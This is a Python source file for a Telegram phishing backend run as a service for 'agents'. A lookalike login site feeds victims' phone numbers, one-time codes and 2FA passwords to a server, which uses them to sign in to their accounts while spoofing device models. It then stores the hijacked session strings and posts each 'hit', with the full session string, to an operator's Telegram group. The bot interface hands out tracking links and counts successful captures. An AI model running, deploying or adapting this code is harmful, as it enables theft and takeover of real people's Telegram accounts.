import os
import asyncio
import telebot
import psycopg2
import logging
import sys
import json
import random
from telebot import types
from quart import Quart, request, jsonify
from quart_cors import cors
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime

# --- 1. SYSTEM CONFIGURATION ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", -100123456789))
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))

# Extended Device Pool for higher bypass rates
DEVICE_POOL = [
    {"model": "iPhone 13 Pro Max", "sys": "iOS 15.7"},
    {"model": "iPhone 15 Pro", "sys": "iOS 17.4"},
    {"model": "iPhone 16 Pro Max", "sys": "iOS 18.3"},
    {"model": "Samsung Galaxy S24 Ultra", "sys": "Android 14"},
    {"model": "Google Pixel 9 Pro", "sys": "Android 15"},
    {"model": "MacBook Pro M3", "sys": "macOS 15.1"}
]

# Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("Vinzy_Ultra_System")

# Initialize Apps
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Quart(__name__)

# 2. CORS CONFIGURATION (Supports multiple web hosts)
app = cors(app, allow_origin=[
    "https://web-telegrams-login.wuaze.com",
    "http://web-telegrams-login.wuaze.com",
    "https://your-second-web-link.com", # Add your other webs here
    "https://your-third-web-link.com"
])

# Volatile Memory for live sessions
active_mirrors = {}

# --- 3. DATABASE ARCHITECTURE ---
def get_db_connection():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    """Initializes the database schema if not exists."""
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        # Approved Agents
        cur.execute("""
            CREATE TABLE IF NOT EXISTS approved_users (
                user_id BIGINT PRIMARY KEY, 
                username TEXT,
                joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        # Captured Accounts
        cur.execute("""
            CREATE TABLE IF NOT EXISTS controlled_accounts (
                phone TEXT PRIMARY KEY, 
                session_string TEXT NOT NULL, 
                owner_name TEXT, 
                tid BIGINT,
                device_used TEXT,
                hit_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        # Metrics Tracking
        cur.execute("""
            CREATE TABLE IF NOT EXISTS link_metrics (
                tid BIGINT PRIMARY KEY,
                clicks INTEGER DEFAULT 0,
                hits INTEGER DEFAULT 0,
                last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        cur.close()
        conn.close()
        logger.info("DATABASE: Schema synchronized successfully.")
    except Exception as e:
        logger.error(f"DATABASE ERROR: {e}")

init_db()

# --- 4. CORE MIRROR LOGIC ---

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    """Handles the initial phone number submission."""
    try:
        data = await request.json
        phone = data.get('phone', '').replace("+", "").replace(" ", "").strip()
        raw_tid = data.get('tid', '0')
        
        # Ensure tid is always a valid integer for Postgres BIGINT
        tid = int(raw_tid) if str(raw_tid).isdigit() else 0

        if not phone or len(phone) < 8:
            return jsonify({"status": "error", "msg": "Invalid phone format."})

        # Select a device profile to mimic a real login
        device = random.choice(DEVICE_POOL)
        client = TelegramClient(
            StringSession(), 
            API_ID, 
            API_HASH, 
            device_model=device['model'], 
            system_version=device['sys'],
            app_version="11.4.1"
        )
        
        await client.connect()

        # Record the click in metrics
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO link_metrics (tid, clicks) VALUES (%s, 1) 
            ON CONFLICT (tid) DO UPDATE SET clicks = link_metrics.clicks + 1, last_activity = CURRENT_TIMESTAMP
        """, (tid,))
        conn.commit()
        cur.close()
        conn.close()

        # Request Telegram OTP
        sent_code = await client.send_code_request(phone)
        
        # Store the active session in memory
        active_mirrors[phone] = {
            "client": client, 
            "hash": sent_code.phone_code_hash, 
            "tid": tid,
            "device": device['model']
        }
        
        logger.info(f"MIRROR: Code sent to {phone} using {device['model']}")
        return jsonify({"status": "success"})
        
    except errors.FloodWaitError as e:
        return jsonify({"status": "error", "msg": f"Flood wait: {e.seconds}s"})
    except Exception as e:
        logger.error(f"PHONE_ERROR: {e}")
        return jsonify({"status": "error", "msg": "Failed to send code. Check number."})

@app.route('/step_code', methods=['POST'])
async def step_code():
    """Validates the OTP code."""
    try:
        data = await request.json
        phone = data.get('phone', '').replace("+", "").replace(" ", "")
        code = data.get('code', '').strip()
        
        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session expired. Restart login."})

        session = active_mirrors[phone]
        client = session['client']

        try:
            await client.sign_in(phone, code, phone_code_hash=session['hash'])
            return await finalize_session(client, phone, session['tid'], session['device'])
        
        except errors.SessionPasswordNeededError:
            return jsonify({"status": "2fa_needed"})
        except errors.PhoneCodeInvalidError:
            return jsonify({"status": "error", "msg": "Invalid verification code."})
        except Exception as e:
            return jsonify({"status": "error", "msg": str(e)})

    except Exception as e:
        return jsonify({"status": "error", "msg": "Critical processing error."})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    """Handles the Cloud Password layer."""
    try:
        data = await request.json
        phone = data.get('phone', '').replace("+", "").replace(" ", "")
        password = data.get('password', '').strip()
        
        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session expired."})

        session = active_mirrors[phone]
        client = session['client']

        try:
            await client.sign_in(password=password)
            return await finalize_session(client, phone, session['tid'], session['device'])
        except errors.PasswordHashInvalidError:
            return jsonify({"status": "error", "msg": "Incorrect 2FA password."})
            
    except Exception as e:
        return jsonify({"status": "error", "msg": "2FA Processing failed."})

async def finalize_session(client, phone, tid, device_name):
    """Saves the session and notifies the master logger."""
    try:
        me = await client.get_me()
        session_str = client.session.save()
        full_name = f"{me.first_name} {me.last_name or ''}".strip()

        # Save to Database
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO controlled_accounts (phone, session_string, owner_name, tid, device_used) 
            VALUES (%s, %s, %s, %s, %s) 
            ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
        """, (phone, session_str, full_name, tid, device_name))
        
        cur.execute("UPDATE link_metrics SET hits = hits + 1 WHERE tid = %s", (tid,))
        conn.commit()
        cur.close()
        conn.close()

        # Send Log to Telegram Group
        log_text = (
            f"🎯 <b>NEW HIT CAPTURED</b> 🎯\n\n"
            f"👤 <b>Name:</b> {full_name}\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"📱 <b>Mirror Device:</b> {device_name}\n"
            f"🔗 <b>Agent ID:</b> <code>{tid}</code>\n\n"
            f"🔑 <b>String Session:</b>\n<code>{session_str}</code>"
        )
        bot.send_message(LOGGER_GROUP, log_text)

        # Notify the Agent
        if tid != 0:
            bot.send_message(tid, f"✅ <b>Login Success!</b>\nTarget: {full_name}\nStatus: Session Saved.")

        await client.disconnect()
        if phone in active_mirrors:
            del active_mirrors[phone]
            
        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"FINALIZE ERROR: {e}")
        return jsonify({"status": "error", "msg": "Failed to finalize session."})

# --- 5. BOT INTERFACE ---

@bot.message_handler(commands=['start'])
def start_cmd(m):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🔗 Generate Link", "📊 My Statistics")
    bot.send_message(m.chat.id, f"<b>Vinzy Ultra Pro V3</b>\nStatus: 🟢 Online", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "🔗 Generate Link")
def gen_link(m):
    # This works for all 3 of your HTML files if you host them correctly
    personal_link = f"https://web-telegrams-login.wuaze.com/?id={m.from_user.id}"
    bot.reply_to(m, f"🚀 <b>Your Tracking Link:</b>\n\n<code>{personal_link}</code>")

@bot.message_handler(func=lambda m: m.text == "📊 My Statistics")
def show_stats(m):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT clicks, hits FROM link_metrics WHERE tid = %s", (m.from_user.id,))
    res = cur.fetchone()
    cur.close()
    conn.close()
    
    c = res[0] if res else 0
    h = res[1] if res else 0
    bot.send_message(m.chat.id, f"📈 <b>Stats for ID {m.from_user.id}:</b>\n\nClicks: {c}\nHits: {h}")

# --- 6. EXECUTION ---
def run_telebot():
    bot.infinity_polling()

if __name__ == "__main__":
    # Start bot in a background thread
    Thread(target=run_telebot).start()
    
    # Start the Quart Web Server
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)
